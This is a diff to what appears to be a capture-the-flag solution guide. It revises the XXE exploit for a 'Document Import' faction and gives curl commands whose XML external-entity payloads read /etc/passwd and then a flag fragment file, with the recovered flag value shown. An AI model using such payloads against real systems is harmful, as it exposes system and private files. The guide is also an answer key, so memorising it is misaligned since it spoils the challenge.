@@ -115,22 +115,38 @@ field never shown for a clean, non-injected, single-entry match.
 
 ## Faction 4, Document Import (XXE file read)
 
-Identical bug and sink shape to the King's Sealed Archives (p5_3): the
+Identical bug and sink shape to the King's Sealed Archives (p5_4): the
 exact same `core.xml_parser.parse()` call, `resolve_entities=True` and
 `load_dtd=True` included, feeding a route that echoes back a parsed
-element's resolved text.
+element's resolved text. The *target* is different, this reads the
+Document faction's own fragment, not the King's flag.
 
-Payload:
+**Finding the path without guessing.** The fragment lives in a real OS
+account's home directory, so the same read primitive discovers it: prove
+the XXE on a universal file first, and that file also names where to look
+next:
 
 ```bash
 curl -s -X POST "$BASE/f/omnigrid/import" \
     --data-urlencode 'token=CHAIR-D1R3CT0RY-4e6b' \
-    --data-urlencode 'xml=<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///opt/omnigrid/fragment.txt">]><request><document>&xxe;</document></request>'
+    --data-urlencode 'xml=<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><request><document>&xxe;</document></request>'
 ```
 
-Recovers `CHAIR-D0CX7Q-9a3f`, read from `/opt/omnigrid/fragment.txt`, a
-file sealed outside the app's own source tree, added by the
-`Dockerfile`, never served by any other route.
+`/etc/passwd` reads back in full and contains the line
+`omnigrid:x:998:998::/home/omnigrid:/usr/sbin/nologin`, so the OmniGrid
+document service's files live under `/home/omnigrid`. Then read the
+fragment directly:
+
+```bash
+curl -s -X POST "$BASE/f/omnigrid/import" \
+    --data-urlencode 'token=CHAIR-D1R3CT0RY-4e6b' \
+    --data-urlencode 'xml=<?xml version="1.0"?><!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///home/omnigrid/fragment.txt">]><request><document>&xxe;</document></request>'
+```
+
+Recovers `CHAIR-D0CX7Q-9a3f`, read from `/home/omnigrid/fragment.txt`, a
+file in a real account's home directory (created by the `Dockerfile`,
+never shipped in the app's source tree), never served by any other
+route, and discoverable, not guessable, via `/etc/passwd`.
 
 ## Seizing the seat
 
